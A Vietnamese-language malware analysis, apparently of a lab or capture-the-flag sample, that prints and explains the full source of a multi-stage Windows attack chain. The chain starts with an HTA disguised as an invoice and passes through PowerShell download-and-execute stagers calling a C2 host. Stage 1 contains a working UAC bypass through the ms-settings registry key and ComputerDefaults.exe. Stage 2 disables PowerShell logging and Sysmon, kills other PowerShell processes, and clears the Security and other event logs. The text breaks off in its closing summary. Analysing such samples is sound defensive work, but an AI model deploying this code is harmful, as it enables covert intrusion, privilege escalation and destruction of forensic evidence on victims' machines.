# 1. Invoice_October.hta

<details>
<summary>Bấm vào đây để xem nội dung</summary>

```hta
<html>
<head><title>Invoice October 2026</title>
<HTA:APPLICATION WINDOWSTATE="minimize" SHOWINTASKBAR="no"/>
<script language="VBScript">
    On Error Resume Next
    Set WshShell = CreateObject("WScript.Shell")
    Dim cmd
    cmd = "powershell.exe -NoP -W H -Exec Bypass -C ""[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Net.WebRequest]::DefaultWebProxy=$null;$wc=New-Object Net.WebClient;$wc.Proxy=$null;IEX $wc.DownloadString('https://192.168.56.100:8443/loader.ps1')"""
    WshShell.Run cmd, 0, false
    window.close()
</script>
</html>
```

</details>


## 1.1. Lớp ngụy trang (Social Engineering)

| Yếu tố | Mục đích |
|---|---|
| **Tên file** `Invoice_October.hta` | Đánh lừa người dùng mở vì tưởng là hóa đơn tháng 10/2026 |
| `<title>Invoice October 2026</title>` | Củng cố vỏ bọc "hóa đơn" |
| `<HTA:APPLICATION WINDOWSTATE="minimize" SHOWINTASKBAR="no"/>` | Cửa sổ tự thu nhỏ và ẩn khỏi taskbar → người dùng không thấy cửa sổ nào mở, không nghi ngờ |
| `window.close()` ở cuối | Tự đóng ngay sau khi chạy → không để lại dấu hiệu trực quan |

## 1.2. Cơ chế thực thi — VBScript

```vbscript
On Error Resume Next
Set WshShell = CreateObject("WScript.Shell")
```

- `On Error Resume Next`: bỏ qua mọi lỗi, đảm bảo script chạy tiếp ngay cả khi gặp sự cố.
- `WScript.Shell`: đối tượng cho phép chạy lệnh hệ thống.

```vbscript
WshShell.Run cmd, 0, false
```

- Tham số `0` = chạy ẩn hoàn toàn (không cửa sổ).
- `false` = không chờ lệnh hoàn thành (fire-and-forget).


## 1.3. Phân tích câu lệnh PowerShell

```text
powershell.exe -NoP -W H -Exec Bypass -C "..."
```

| Cờ | Ý nghĩa |
|---|---|
| `-NoP` | Không load profile PowerShell (tránh bị log/can thiệp) |
| `-W H` | `WindowStyle Hidden` — ẩn cửa sổ |
| `-Exec Bypass` | **Bỏ qua ExecutionPolicy** — cho phép chạy script không ký |
| `-C` | Thực thi lệnh trực tiếp |

**Phần lệnh bên trong:**

```powershell
[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
[Net.WebRequest]::DefaultWebProxy=$null
$wc=New-Object Net.WebClient
$wc.Proxy=$null
IEX $wc.DownloadString('https://192.168.56.100:8443/loader.ps1')
```


| Đoạn | Mục đích |
|---|---|
| `ServerCertificateValidationCallback={$true}` | **Bỏ qua kiểm tra chứng chỉ TLS** → chấp nhận cert tự ký/giả mạo (MITM dễ dàng) |
| `SecurityProtocol = Tls12` | Ép dùng TLS 1.2 (tương thích C2 server) |
| `DefaultWebProxy=$null`, `$wc.Proxy=$null` | **Vô hiệu hóa proxy** → tránh bị proxy doanh nghiệp ghi log/chặn |
| `DownloadString('https://192.168.56.100:8443/loader.ps1')` | **Tải payload** từ IP nội bộ `192.168.56.100`, cổng `8443` (HTTPS không chuẩn) |
| `IEX (...)` | **Invoke-Expression** — thực thi ngay nội dung tải về trong bộ nhớ (fileless malware) |

## 1.4. Chuỗi tấn công tổng thể

```txt
Người dùng mở "Invoice_October.hta"
        │
        ▼
HTA chạy ẩn + đóng ngay
        │
        ▼
VBScript → PowerShell (ẩn, bypass policy)
        │
        ▼
Tắt proxy + tắt xác thực TLS
        │
        ▼
Tải https://192.168.56.100:8443/loader.ps1
        │
        ▼
IEX → thực thi trong bộ nhớ (fileless)
```

# 2. loader.ps1

<details>
<summary>Bấm vào đây để xem nội dung</summary>


```ps1
[Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
[Net.WebRequest]::DefaultWebProxy = $null
$wc = New-Object Net.WebClient
$wc.Proxy = $null
IEX $wc.DownloadString("https://192.168.56.100:8443/stage1.ps1")
```

</details>

<br>

Đoạn này gần như giống hệt payload trong HTA lúc nãy, chỉ khác URL: `stage1.ps1` thay vì `loader.ps1`. Điều này cho thấy đây là stage 1 của chuỗi multi-stage — tức là loader.ps1 (hoặc chính stage1.ps1) lại tải tiếp stage kế tiếp.

# 3. stage1.ps1

<details>
<summary>Bấm vào đây để xem nội dung</summary>

```ps1
function Invoke-Stage1Main {
    [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    [Net.WebRequest]::DefaultWebProxy = $null

    $wc = New-Object Net.WebClient
    $wc.Proxy = $null
    IEX $wc.DownloadString("https://192.168.56.100:8443/stage2.ps1")
}

function Invoke-UACBypass {
    $C2 = "https://192.168.56.100:8443"

    $innerCmd = "[Net.ServicePointManager]::ServerCertificateValidationCallback={`$true};[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Net.WebRequest]::DefaultWebProxy=`$null;`$wc=New-Object Net.WebClient;`$wc.Proxy=`$null;IEX `$wc.DownloadString('$C2/stage1.ps1')"
    $elevatedCmd = "powershell.exe -NoP -W H -Exec Bypass -Command `"$innerCmd`""

    try {
        $regPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
        Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -EA SilentlyContinue
        New-Item $regPath -Force | Out-Null
        New-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -Force | Out-Null
        Set-ItemProperty -Path $regPath -Name "(default)" -Value $elevatedCmd -Force
        Start-Process "C:\Windows\System32\ComputerDefaults.exe" -WindowStyle Hidden
        Start-Sleep -Seconds 8
        Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -EA SilentlyContinue
    } catch {}
}

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if ($isAdmin) { Invoke-Stage1Main } else { Invoke-UACBypass }
```

</details>

<br>


## 3.1. Cấu trúc tổng thể

```powershell
function Invoke-Stage1Main { ... }  # Nhánh ADMIN: tải stage2.ps1
function Invoke-UACBypass { ... }   # Nhánh USER: leo thang qua ComputerDefaults
$isAdmin = (...).IsInRole(...)      # Kiểm tra quyền
if ($isAdmin) { Invoke-Stage1Main } # Nếu admin → chạy stage2
else          { Invoke-UACBypass }  # Nếu chưa → bypass UAC
```

**Logic:** Script tự phát hiện quyền. Nếu chưa admin → bypass UAC để tự chạy lại chính nó với quyền admin (qua `stage1.ps1` tải lại) → sau đó nhánh `$isAdmin` chạy → tải `stage2.ps1`.

→ Đây là **vòng lặp leo thang**: stage1 chạy với user thường → bypass UAC → chạy lại stage1 với admin → tải stage2.

---

## 3.2. Phân tích `Invoke-Stage1Main` (nhánh admin)

```powershell
function Invoke-Stage1Main {
    [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    [Net.WebRequest]::DefaultWebProxy = $null

    $wc = New-Object Net.WebClient
    $wc.Proxy = $null
    IEX $wc.DownloadString("https://192.168.56.100:8443/stage2.ps1")
}
```

- **Giống hệt stage trước**, chỉ khác URL: `stage2.ps1` thay vì `stage1.ps1`.
- **Đây là cầu nối sang stage 2** — payload thực sự nguy hiểm (backdoor/RAT/ransomware) nằm ở `stage2.ps1`.


- Vẫn dùng **fileless execution** (`IEX` + `DownloadString`).
- Vẫn **tắt TLS validation + proxy** để đảm bảo kết nối C2.

**Nhận xét:** Nhánh này chỉ chạy khi script đã có quyền admin. Nghĩa là attacker cố tình đặt payload nặng (stage2) sau khi đã leo thang — để payload đó chạy với quyền cao nhất, có thể:

- Cài service, driver.
- Sửa registry toàn hệ thống.
- Disable Defender/EDR.
- Dump credential (LSASS).

---

## 3.3. Phân tích `Invoke-UACBypass` — phần nguy hiểm nhất

### 3.3.1. Chuẩn bị lệnh nội bộ

```powershell
$c2 = "https://192.168.56.100:8443"

$innerCmd = "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Net.WebRequest]::DefaultWebProxy=$null;`$wc=New-Object Net.WebClient;`$wc.Proxy=`$null;IEX `$wc.DownloadString('$c2/stage1.ps1')"

$elevatedCmd = "powershell.exe -NoP -W H -Exec Bypass -Command `"$innerCmd`""
```

- `$innerCmd`: lại là **downloader y hệt** nhưng tải `stage1.ps1` (chính nó) — tạo vòng lặp: khi chạy với admin, stage1 sẽ đi vào nhánh `$isAdmin` → tải `stage2.ps1`.


| Bước | Hành động | Mục đích |
|---|---|---|
| 1 | `Remove-Item ...ms-settings` | Dọn dấu vết cũ (nếu có) để tránh xung đột |
| 2 | `New-Item $regPath` | Tạo key `HKCU\Software\Classes\ms-settings\shell\open\command` |
| 3 | `New-ItemProperty ... "DelegateExecute" = ""` | **Bẫy quan trọng:** giá trị rỗng của `DelegateExecute` khiến Windows bỏ qua việc mở Settings app mặc định và chạy thẳng lệnh trong `(default)` |
| 4 | `Set-ItemProperty ... "(default)" = $elevatedCmd` | Ghi lệnh PowerShell độc hại vào default value |
| 5 | `Start-Process ComputerDefaults.exe -WindowStyle Hidden` | **Trigger:** `ComputerDefaults.exe` là binary **auto-elevate** (có manifest `autoElevate=true`). Khi nó cố mở `ms-settings:` → Windows đọc registry HKCU (do user kiểm soát) → chạy lệnh của attacker **với quyền admin, không hiện UAC prompt** |
| 6 | `Start-Sleep -Seconds 8` | Chờ payload chạy xong |
| 7 | `Remove-Item ...ms-settings` | **Xóa dấu vết registry** — quan trọng để tránh bị phát hiện |


### 3.3.3. Tại sao kỹ thuật này hoạt động?

- `ComputerDefaults.exe` nằm trong `C:\Windows\System32\` và có manifest `autoElevate="true"` → khi chạy, nó tự động chạy với quyền admin mà không cần UAC prompt.
- `ComputerDefaults.exe` gọi protocol `ms-settings:` (qua COM) để mở Settings.
- Windows tra cứu registry theo thứ tự: **HKCU trước HKLM**. Vì attacker ghi vào `HKCU\Software\Classes\ms-settings\...`, nó ghi đè handler mặc định của hệ thống.
- Giá trị `DelegateExecute` rỗng → Windows **không dùng COM delegate** mà chạy thẳng `(default)` command.
- Kết quả: **leo thang từ user thường lên admin mà không có UAC prompt nào hiện ra.**

### 3.3.4. Tại sao phải xóa registry sau 8 giây?

- **Tránh detection:** EDR/AV thường quét registry persistence locations. Key `ms-settings` bị hijack là IOC nổi tiếng — nhiều rule YARA/Sigma bắt cái này.
- **Tránh lỗi hệ thống:** nếu để lại, mọi lần user mở Settings sẽ chạy payload → gây bất thường, dễ bị phát hiện.
- **8 giây:** đủ để `ComputerDefaults.exe` khởi động, đọc registry, chạy PowerShell con, và PowerShell con tải xong `stage1.ps1` (chạy với admin). Sau đó xóa là an toàn.

## 3.4. Luồng thực thi đầy đủ (khi chưa admin)

```TXT
stage1.ps1 (chạy với user thường)
        │
        ├── $isAdmin = $false
        │
        ▼
Invoke-UACBypass
        │
        ├── Ghi registry HKCU\...\ms-settings\shell\open\command
        │     (default) = powershell.exe ... IEX DownloadString('.../stage1.ps1')
        │     DelegateExecute = ""
        │
        ├── Start-Process ComputerDefaults.exe  ← auto-elevate
        │       │
        │       ▼
        │   Windows đọc HKCU registry → chạy lệnh attacker với ADMIN
        │       │
        │       ▼
        │   powershell.exe (admin) IEX DownloadString('.../stage1.ps1')
        │       │
        │       ▼
        │   stage1.ps1 (chạy với ADMIN)
        │       │
        │       ├── $isAdmin = $true
        │       │
        │       ▼
        │   Invoke-Stage1Main
        │       │
        │       ▼
        │   IEX DownloadString('.../stage2.ps1')   ← PAYLOAD THẬT
        │
        └── Start-Sleep 8s → Remove-Item registry (xóa dấu vết)
```

## 3.5. Tóm tắt chuỗi tấn công hoàn chỉnh

```TXT
[Stage 0] Invoice_October.hta
    │  (VBScript + WScript.Shell, ẩn, tự close)
    ▼
[Stage 0.5] powershell.exe -NoP -W H -Exec Bypass -C "IEX DownloadString(.../loader.ps1)"
    │
    ▼
[Stage 1] loader.ps1  (downloader thuần — giống stage1 nhưng không có UAC bypass)
    │  IEX DownloadString(.../stage1.ps1)
    ▼
[Stage 1.5] stage1.ps1  ← FILE BẠN VỪA ĐƯA
    │
    ├── Nếu chưa admin:
    │     └── UAC Bypass (ms-settings + ComputerDefaults.exe)
    │           └── chạy lại stage1.ps1 với ADMIN
    │
    └── Nếu đã admin:
          └── IEX DownloadString(.../stage2.ps1)
                │
                ▼
        [Stage 2] stage2.ps1  ← PAYLOAD THẬT (chưa thấy)
                │
                ▼
        (RAT / ransomware / infostealer / backdoor...)
```

# 4. stage2.ps1

<details>
<summary>Bấm vào đây để xem nội dung</summary>

```ps1
function Invoke-Stage2Main {
    [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    [Net.WebRequest]::DefaultWebProxy = $null

    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if (-not $isAdmin) { return }

    # =========================================================
    # PHASE 1: Disable ALL logging policies (4 paths)
    # =========================================================
    $policies = @(
        @{Path="HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"; Name="EnableScriptBlockLogging"},
        @{Path="HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging";      Name="EnableModuleLogging"},
        @{Path="HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription";      Name="EnableTranscripting"},
        @{Path="HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"; Name="EnableScriptBlockLogging"},
        @{Path="HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ModuleLogging";      Name="EnableModuleLogging"},
        @{Path="HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\Transcription";      Name="EnableTranscripting"}
    )
    foreach ($p in $policies) {
        if (-not (Test-Path $p.Path)) { New-Item -Path $p.Path -Force | Out-Null }
        Set-ItemProperty -Path $p.Path -Name $p.Name -Value 0 -Type DWord -Force
    }

    # Xoa HKCU policies
    @(
        "HKCU:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging",
        "HKCU:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging",
        "HKCU:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription"
    ) | ForEach-Object { if (Test-Path $_) { Remove-Item $_ -Recurse -Force -EA SilentlyContinue } }

    # =========================================================
    # PHASE 2: Disable channels
    # =========================================================
    wevtutil sl "Microsoft-Windows-PowerShell/Operational" /e:false 2>&1 | Out-Null
    wevtutil sl "Microsoft-Windows-TaskScheduler/Operational" /e:false 2>&1 | Out-Null
    wevtutil sl "Microsoft-Windows-Sysmon/Operational" /e:false 2>&1 | Out-Null
    wevtutil sl "Microsoft-Windows-WMI-Activity/Operational" /e:false 2>&1 | Out-Null

    # =========================================================
    # PHASE 3: Kill WmiPrvSE + all other PS (tranh sinh event)
    # =========================================================
    #Get-Process WmiPrvSE -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
    Get-Process powershell -EA SilentlyContinue |
        Where-Object { $_.Id -ne $PID } |
        Stop-Process -Force -EA SilentlyContinue
    Start-Sleep 2

    # =========================================================
    # PHASE 4: Clear logs tu cmd.exe
    # =========================================================
    $clearCmds = 'wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>nul & ' +
                 'wevtutil cl "Microsoft-Windows-TaskScheduler/Operational" 2>nul & ' +
                 'wevtutil cl "Microsoft-Windows-Sysmon/Operational" 2>nul & ' +
                 'wevtutil cl "Microsoft-Windows-WMI-Activity/Operational" 2>nul & ' +
                 'wevtutil cl "Application" 2>nul & ' +
                 'wevtutil cl "System" 2>nul & ' +
                 'wevtutil cl "Security" 2>nul'

    Start-Process cmd.exe -ArgumentList "/c", $clearCmds -WindowStyle Hidden -Wait

    # =========================================================
    # PHASE 5: Sleep 15s + 2nd clear
    # =========================================================
    Start-Sleep -Seconds 2
    Start-Process cmd.exe -ArgumentList "/c", $clearCmds -WindowStyle Hidden -Wait

    # =========================================================
    # PHASE 6: Don temp files
    # =========================================================
    Start-Sleep 3
    Get-ChildItem "$env:TEMP\__PSScriptPolicyTest_*.ps1" -EA SilentlyContinue |
        Remove-Item -Force -EA SilentlyContinue

    # =========================================================
    # PHASE 7: Spawn NEW PowerShell process cho stage3
    # => Process moi doc policy=0 => KHONG LOG 4104
    # =========================================================
    $stage3Cmd = "[Net.ServicePointManager]::ServerCertificateValidationCallback={`$true};" +
                 "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" +
                 "[Net.WebRequest]::DefaultWebProxy=`$null;" +
                 "`$wc=New-Object Net.WebClient;`$wc.Proxy=`$null;" +
                 "IEX `$wc.DownloadString('https://192.168.56.100:8443/stage3.ps1')"

    Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoP","-W","H","-Exec","Bypass","-C",$stage3Cmd

    # =========================================================
    # PHASE 8: EXIT NGAY — process nay chet => khong sinh event
    # =========================================================
    exit
}

Invoke-Stage2Main
```

</details>

<br>



Đây là **stage 2 — không phải payload cuối, mà là "dọn dẹp dấu vết + tắt toàn bộ logging + spawn stage3"**. Đây là mẫu **defense evasion** cực kỳ hoàn chỉnh. Mục tiêu duy nhất của stage này: **xóa sạch mọi log có thể tố cáo hành vi trước đó, rồi chuyển sang stage 3 trong một process "sạch" không bị log.**

So với stage 1, stage 2 **không có UAC bypass** (vì đã admin rồi) — nó tập trung 100% vào **anti-forensic**.

---

## 4.1. Cấu trúc tổng thể

```text
Invoke-Stage2Main
├── Kiểm tra admin (nếu không phải → return)
│
├── PHASE 1: Tắt logging policies qua registry (6 path)
├── PHASE 2: Disable event channels (wevtutil)
├── PHASE 3: Kill các process PowerShell khác (tránh sinh event)
├── PHASE 4: Clear logs lần 1 (qua cmd.exe, 7 log)
├── PHASE 5: Clear logs lần 2 (sau 2s)
├── PHASE 6: Xóa temp files
├── PHASE 7: Spawn PowerShell MỚI → tải stage3.ps1
└── PHASE 8: exit ngay
```

**Logic cốt lõi:**

1. Tắt hết logging trước khi làm bất cứ điều gì khác.
2. Xóa log cũ (của stage 0, 1, 2).
3. Spawn process mới → process mới đọc policy mới (đã tắt) → **không sinh log 4104 cho stage 3**.
4. Process cũ `exit` ngay → không để lại event "process exit".


## 4.2. Phân tích từng PHASE

### PHASE 0 — Gate admin

```powershell
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
if (-not $isAdmin) { return }
```

- Nếu không phải admin → **return im lặng** (không lỗi, không log).
- Đảm bảo stage 2 chỉ chạy khi đã leo thang thành công từ stage 1.

---

### PHASE 1 — Disable ALL logging policies (registry)

```powershell
$policies = @(
    @{Path="HKLM:\...\PowerShell\ScriptBlockLogging"; Name="EnableScriptBlockLogging"},
    @{Path="HKLM:\...\PowerShell\ModuleLogging";      Name="EnableModuleLogging"},
    @{Path="HKLM:\...\PowerShell\Transcription";      Name="EnableTranscripting"},
    @{Path="HKLM:\...\Wow6432Node\...\ScriptBlockLogging"; ...},
    @{Path="HKLM:\...\Wow6432Node\...\ModuleLogging";      ...},
    @{Path="HKLM:\...\Wow6432Node\...\Transcription";      ...}
)
foreach ($p in $policies) {
    if (-not (Test-Path $p.Path)) { New-Item -Path $p.Path -Force | Out-Null }
    Set-ItemProperty -Path $p.Path -Name $p.Name -Value 0 -Type DWord -Force
}
```

**Tắt 3 loại logging quan trọng nhất của PowerShell:**


| Policy | Tác dụng khi bật | Tác dụng khi bị tắt |
|---|---|---|
| `ScriptBlockLogging` | **Ghi toàn bộ nội dung script** vào Event ID **4104** (kể cả script fileless) | Không còn 4104 → **không thấy code stage 3** |
| `ModuleLogging` | Ghi log module PowerShell được load | Không thấy module lạ |
| `Transcription` | Ghi transcript toàn bộ session ra file | Không có transcript |

**Điểm tinh vi:** Tắt cả 2 nhánh registry:

- `HKLM\SOFTWARE\...` — cho process **64-bit**.
- `HKLM\SOFTWARE\Wow6432Node\...` — cho process **32-bit**.

→ Đảm bảo dù stage 3 chạy 32-bit hay 64-bit đều **không bị log**. Đây là chi tiết cho thấy attacker rất chuyên nghiệp.

Sau đó xóa policy ở `HKCU`:

```powershell
@(
    "HKCU:\...\ScriptBlockLogging",
    "HKCU:\...\ModuleLogging",
    "HKCU:\...\Transcription"
) | ForEach-Object { if (Test-Path $_) { Remove-Item $_ -Recurse -Force -EA SilentlyContinue } }
```

- **Xóa policy user-level** — phòng trường hợp có GPO per-user hoặc policy do user tự set (ít phổ biến nhưng vẫn dọn).


### PHASE 2 — Disable event channels

```powershell
wevtutil sl "Microsoft-Windows-PowerShell/Operational"     /e:false
wevtutil sl "Microsoft-Windows-TaskScheduler/Operational"  /e:false
wevtutil sl "Microsoft-Windows-Sysmon/Operational"          /e:false
wevtutil sl "Microsoft-Windows-WMI-Activity/Operational"    /e:false
```

- `wevtutil sl <channel> /e:false` = **disable event channel** (ngừng ghi log vào channel đó).
- Tắt 4 channel quan trọng nhất để phát hiện malware:

| Channel | Nếu không tắt sẽ lộ gì |
|---|---|
| `PowerShell/Operational` | **Event 4104** (script block), **4103** (module), **400/403** (engine start/stop) |
| `TaskScheduler/Operational` | **Event 106** (task created), **200** (action started) — nếu stage 3 tạo scheduled task persistence |
| `Sysmon/Operational` | **Toàn bộ Sysmon** — process creation (1), network (3), registry (13), file (11), DNS (22)... → tắt Sysmon là mất 90% khả năng detection |
| `WMI-Activity/Operational` | **Event 5857/5860/5861** — nếu stage 3 dùng WMI persistence |

**Nhận xét:** Việc **tắt Sysmon** cho thấy attacker biết rõ môi trường có thể có Sysmon (EDR/blue team) và **ưu tiên vô hiệu hóa nó** trước khi làm bất cứ điều gì khác. Đây là **dấu hiệu của malware cấp độ APT**, không phải script kid.


### PHASE 3 — Kill other PowerShell processes

```powershell
#Get-Process WmiPrvSE ... | Stop-Process ...   ← bị comment
Get-Process powershell -EA SilentlyContinue |
    Where-Object { $_.Id -ne $PID } |
    Stop-Process -Force -EA SilentlyContinue
Start-Sleep 2
```

- **Kill tất cả `powershell.exe` khác** (trừ chính nó `$PID`) — mục đích:
  - **Tránh sinh thêm event** từ các process PowerShell khác (ví dụ: process stage 1 vẫn còn chạy, có thể đang chuẩn bị ghi log).
  - **Dọn sạch môi trường** trước khi spawn stage 3 — đảm bảo chỉ có 1 process PowerShell "sạch" của attacker chạy.
- `WmiPrvSE` **bị comment out** — có thể attacker đã thử nhưng gây lỗi hệ thống (kill WmiPrvSE làm hỏng WMI → nhiều dịch vụ chết), nên để lại làm "phòng khi cần".
- `Start-Sleep 2` — chờ process chết hẳn, nhả handle.

**Rủi ro cho attacker:** Nếu blue team đang chạy PowerShell để điều tra → **bị kill ngay**. Đây là hành vi **anti-investigation** rõ ràng.


### PHASE 4 — Clear logs lần 1 (qua `cmd.exe`)

```powershell
$clearCmds = 'wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>nul & ' +
             'wevtutil cl "Microsoft-Windows-TaskScheduler/Operational" 2>nul & ' +
             'wevtutil cl "Microsoft-Windows-Sysmon/Operational" 2>nul & ' +
             'wevtutil cl "Microsoft-Windows-WMI-Activity/Operational" 2>nul & ' +
             'wevtutil cl "Application" 2>nul & ' +
             'wevtutil cl "System" 2>nul & ' +
             'wevtutil cl "Security" 2>nul'

Start-Process cmd.exe -ArgumentList "/c", $clearCmds -WindowStyle Hidden -Wait
```

- `wevtutil cl <log>` = **clear log** (xóa toàn bộ event trong log).
- Xóa **7 log**: 4 channel vừa tắt + `Application` + `System` + `Security`.
- **Tại sao chạy qua `cmd.exe` mà không chạy trực tiếp trong PowerShell?**
  - **Tránh sinh event 4104** từ chính lệnh `wevtutil` (nếu chạy trực tiếp trong PS, lệnh sẽ bị log vào 4104 — dù policy đã tắt, nhưng vẫn có thể còn event cũ trong buffer).
  - **Tạo "khoảng cách" process:** event `process creation` sẽ ghi `cmd.exe` là con của `powershell.exe`, nhưng lệnh `wevtutil` bên trong `cmd.exe` không bị PowerShell log.
  - `2>nul` — ẩn mọi lỗi (nếu log đã bị disable, `wevtutil cl` có thể báo lỗi).
- `-WindowStyle Hidden` — không hiện cửa sổ cmd.
- `-Wait` — chờ cmd chạy xong trước khi tiếp tục.

**Điểm cực kỳ nguy hiểm:** Xóa `Security` log — đây là log chứa:

- Event 4624 (logon), 4625 (failed logon)
- Event 4672 (special privileges assigned — **dấu hiệu UAC bypass**)
- Event 4688 (process creation — nếu bật audit)
- Event 1102 (log cleared — nhưng chính event này cũng bị xóa luôn!)

→ Xóa `Security` log = **xóa toàn bộ dấu vết leo thang đặc quyền và thực thi lệnh**.


### PHASE 5 — Clear logs lần 2 (sau 2s)

```powershell
Start-Sleep -Seconds 2
Start-Process cmd.exe -ArgumentList "/c", $clearCmds -WindowStyle Hidden -Wait
```

- **Tại sao xóa 2 lần?**
  - Lần 1: xóa log cũ (từ stage 0, 1).
  - **Trong 2 giây** chờ, có thể có event mới sinh ra (process exit của `cmd.exe` lần 1, event từ `Start-Sleep`, event từ chính script đang chạy...).
  - Lần 2: xóa nốt những event vừa sinh trong 2 giây đó.
- Đây là **double-tap** — kỹ thuật anti-forensic chuyên nghiệp để đảm bảo không còn event nào sau khi stage 2 kết thúc.

---

### PHASE 6 — Xóa temp files

```powershell
Start-Sleep 3
Get-ChildItem "$env:TEMP\__PSScriptPolicyTest_*.ps1" -EA SilentlyContinue |
    Remove-Item -Force -EA SilentlyContinue
```

- `__PSScriptPolicyTest_*.ps1` — file tạm do **PowerShell** tạo ra khi kiểm tra **ExecutionPolicy** (mỗi lần chạy script với policy `AllSigned`/`RemoteSigned`, PS tạo file test trong `%TEMP%`).
- **Tại sao xóa?** File này có thể chứa dấu vết của script gốc (một phần nội dung hoặc metadata), và thời gian tạo file là IOC (thời điểm malware chạy).
- Đây là chi tiết rất tinh vi — hầu hết malware không dọn file này.


### PHASE 7 — Spawn NEW PowerShell cho stage 3

```powershell
$stage3Cmd = "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};" +
             "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" +
             "[Net.WebRequest]::DefaultWebProxy=`$null;" +
             "`$wc=New-Object Net.WebClient;`$wc.Proxy=`$null;" +
             "IEX `$wc.DownloadString('https://192.168.56.100:8443/stage3.ps1')"

Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoP","-W","H","-Exec","Bypass","-C",$stage3Cmd
```

- **Tạo process PowerShell MỚI** (không phải chạy `IEX` trong process hiện tại).
- **Lý do quan trọng:**
  - Process hiện tại (stage 2) đã chạy từ trước khi policy bị tắt → policy logging đã load vào memory → vẫn có thể log 4104 dù registry đã = 0 (vì policy được đọc lúc process start).
  - Process mới khởi động sau khi policy = 0 → đọc policy mới → **KHÔNG log 4104**.
  - Đây là kỹ thuật **"policy refresh via new process"** — rất thông minh.
- `$stage3Cmd` lại là **downloader y hệt** (TLS bypass + proxy bypass + IEX DownloadString) — tải `stage3.ps1`.
- `-WindowStyle Hidden`, `-NoP`, `-W H`, `-Exec Bypass` — vẫn ẩn và bypass.

**Điểm mấu chốt:** Process stage 3 sẽ không có bất kỳ log nào vì:

1. Policy 4104 đã tắt (registry = 0).
2. Channel `PowerShell/Operational` đã disable.
3. Sysmon đã disable.
4. Process stage 3 là **process mới** → không kế thừa buffer log của stage 2.

→ **Stage 3 hoàn toàn vô hình với logging.**


### PHASE 8 — Exit ngay

```powershell
exit
```

- Process stage 2 **tự kết thúc ngay** sau khi spawn stage 3.
- **Mục đích:**
  - Không sinh event "process exit" (nếu có log).
  - Không để process stage 2 tồn tại lâu → khó bị EDR phát hiện qua behavior analysis.
  - **Cắt chuỗi parent-child:** stage 3 là con của stage 2, nhưng stage 2 chết ngay → khó trace ngược.
- **Lưu ý:** `exit` chỉ thoát khỏi function/script, nhưng vì đây là script top-level (`Invoke-Stage2Main` được gọi ở cuối) → thoát luôn process PowerShell.



## 4.3. Luồng thực thi đầy đủ

```txt
stage1.ps1 (admin)
    │
    ▼
IEX DownloadString('.../stage2.ps1')
    │
    ▼
stage2.ps1 (chạy trong process PowerShell hiện tại)
    │
    ├── Check admin → OK
    │
    ├── PHASE 1: Registry: tắt ScriptBlockLogging, ModuleLogging, Transcription (x64 + x86)
    │
    ├── PHASE 2: wevtutil disable: PowerShell, TaskScheduler, Sysmon, WMI-Activity
    │
    ├── PHASE 3: Kill tất cả powershell.exe khác (trừ mình)
    │
    ├── PHASE 4: cmd.exe → wevtutil cl 7 log (PowerShell, TaskScheduler, Sysmon, WMI, App, System, Security)
    │
    ├── PHASE 5: sleep 2s → clear lại lần 2 (xóa event vừa sinh)
    │
    ├── PHASE 6: Xóa %TEMP%\__PSScriptPolicyTest_*.ps1
    │
    ├── PHASE 7: Spawn powershell.exe MỚI (process sạch, không log)
    │       │
    │       ▼
    │   IEX DownloadString('.../stage3.ps1')   ← STAGE 3 (payload thật)
    │
    └── PHASE 8: exit (process stage 2 chết)
```

## 4.4. Tóm tắt toàn bộ kill chain (5 stage)

```txt
[Stage 0]   Invoice_October.hta
                │ VBScript → PowerShell ẩn
                ▼
[Stage 0.5] powershell.exe → IEX DownloadString('.../loader.ps1')
                │
                ▼
[Stage 1]   loader.ps1 (downloader thuần)
